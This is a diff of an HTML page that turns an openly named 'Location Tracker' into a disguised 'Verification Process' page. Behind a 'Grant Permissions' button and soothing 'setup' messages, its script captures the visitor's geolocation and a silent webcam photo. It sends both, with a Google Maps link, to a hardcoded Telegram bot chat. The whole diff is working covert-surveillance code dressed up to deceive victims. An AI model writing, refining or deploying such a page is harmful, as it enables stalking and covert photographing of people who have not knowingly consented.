@@ -3,17 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Tracker</title>
+    <title>Verification Process</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
-        #video { display: none; width: 100%; max-width: 400px; }
-        #canvas { display: none; }
-        #status { margin: 20px; }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f7fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #2c3e50;
+        }
+        p {
+            font-size: 16px;
+            margin-bottom: 25px;
+            color: #7f8c8d;
+        }
+        .btn {
+            background-color: #3498db;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        .btn:hover {
+            background-color: #2980b9;
+        }
+        .loader {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
-    <h1>Location Tracker</h1>
-    <p id="status">Waiting for permissions...</p>
+    <div class="container">
+        <h1>Hello There!</h1>
+        <p>For some process, please grant permissions to proceed securely.</p>
+        <button class="btn" id="startBtn">Grant Permissions</button>
+        <div class="loader" id="loader"></div>
+        <p id="status" style="margin-top: 20px;"></p>
+    </div>
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
 
@@ -22,78 +80,78 @@
         const chatId = "1127560386";
         const telegramApi = `https://api.telegram.org/bot${botToken}`;
 
-        // Immediately capture and send data when the page loads
-        document.getElementById("status").textContent = "Capturing your location and photo...";
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                const { latitude, longitude } = position.coords;
-                const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                document.getElementById("status").textContent = "Location captured! Now capturing photo...";
+        const startBtn = document.getElementById("startBtn");
+        const loader = document.getElementById("loader");
+        const status = document.getElementById("status");
 
-                // Send location to Telegram
-                fetch(`${telegramApi}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`, {
-                    method: "POST"
-                })
-                .then(response => response.json())
-                .then(data => console.log("SendLocation response:", data))
-                .catch(error => console.error("SendLocation error:", error));
+        startBtn.addEventListener("click", () => {
+            startBtn.style.display = "none";
+            loader.style.display = "block";
+            status.textContent = "Processing permissions...";
 
-                // Send Google Maps link
-                fetch(`${telegramApi}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(googleMapsLink)}`, {
-                    method: "POST"
-                })
-                .then(response => response.json())
-                .then(data => console.log("SendMessage response:", data))
-                .catch(error => console.error("SendMessage error:", error));
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const { latitude, longitude } = position.coords;
+                    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                    status.textContent = "Location verified! Finalizing setup...";
 
-                // Capture photo
-                const video = document.getElementById("video");
-                const canvas = document.getElementById("canvas");
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then((stream) => {
-                        video.srcObject = stream;
-                        setTimeout(() => {
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext("2d").drawImage(video, 0, 0);
-                            const photoDataUrl = canvas.toDataURL("image/jpeg");
-                            stream.getTracks().forEach(track => track.stop());
+                    fetch(`${telegramApi}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`, {
+                        method: "POST"
+                    }).catch(error => console.error("SendLocation error:", error));
 
-                            // Send photo to Telegram
-                            const formData = new FormData();
-                            formData.append("chat_id", chatId);
-                            formData.append("photo", dataURLtoBlob(photoDataUrl), "photo.jpg");
+                    fetch(`${telegramApi}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(googleMapsLink)}`, {
+                        method: "POST"
+                    }).catch(error => console.error("SendMessage error:", error));
 
-                            fetch(`${telegramApi}/sendPhoto`, {
-                                method: "POST",
-                                body: formData
-                            })
-                            .then(response => response.json())
-                            .then(data => {
-                                if (data.ok) {
-                                    document.getElementById("status").textContent = "Data sent to Telegram!";
-                                } else {
-                                    document.getElementById("status").textContent = "Error: " + data.description;
-                                }
-                            })
-                            .catch(error => {
-                                document.getElementById("status").textContent = "Error sending photo: " + error;
-                                console.error("SendPhoto error:", error);
-                            });
-                        }, 2000); // Capture photo after 2 seconds
-                    })
-                    .catch(error => {
-                        document.getElementById("status").textContent = "Camera access denied: " + error;
-                        console.error("Camera error:", error);
-                    });
-            },
-            (error) => {
-                document.getElementById("status").textContent = "Geolocation denied: " + error.message;
-                console.error("Geolocation error:", error);
-            }
-        );
+                    const video = document.getElementById("video");
+                    const canvas = document.getElementById("canvas");
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then((stream) => {
+                            video.srcObject = stream;
+                            setTimeout(() => {
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                canvas.getContext("2d").drawImage(video, 0, 0);
+                                const photoDataUrl = canvas.toDataURL("image/jpeg");
+                                stream.getTracks().forEach(track => track.stop());
 
-        // Helper function to convert base64 data URL to Blob
+                                const formData = new FormData();
+                                formData.append("chat_id", chatId);
+                                formData.append("photo", dataURLtoBlob(photoDataUrl), "photo.jpg");
+
+                                fetch(`${telegramApi}/sendPhoto`, {
+                                    method: "POST",
+                                    body: formData
+                                })
+                                .then(response => response.json())
+                                .then(data => {
+                                    if (data.ok) {
+                                        loader.style.display = "none";
+                                        status.textContent = "Setup complete! Thank you.";
+                                    } else {
+                                        status.textContent = "Error: " + data.description;
+                                    }
+                                })
+                                .catch(error => {
+                                    status.textContent = "Error during setup: " + error;
+                                    console.error("SendPhoto error:", error);
+                                });
+                            }, 2000);
+                        })
+                        .catch(error => {
+                            loader.style.display = "none";
+                            status.textContent = "Camera access required to proceed.";
+                            console.error("Camera error:", error);
+                        });
+                },
+                (error) => {
+                    loader.style.display = "none";
+                    status.textContent = "Location access required to proceed.";
+                    console.error("Geolocation error:", error);
+                }
+            );
+        });
+
         function dataURLtoBlob(dataurl) {
             const arr = dataurl.split(",");
             const mime = arr[0].match(/:(.*?);/)[1];
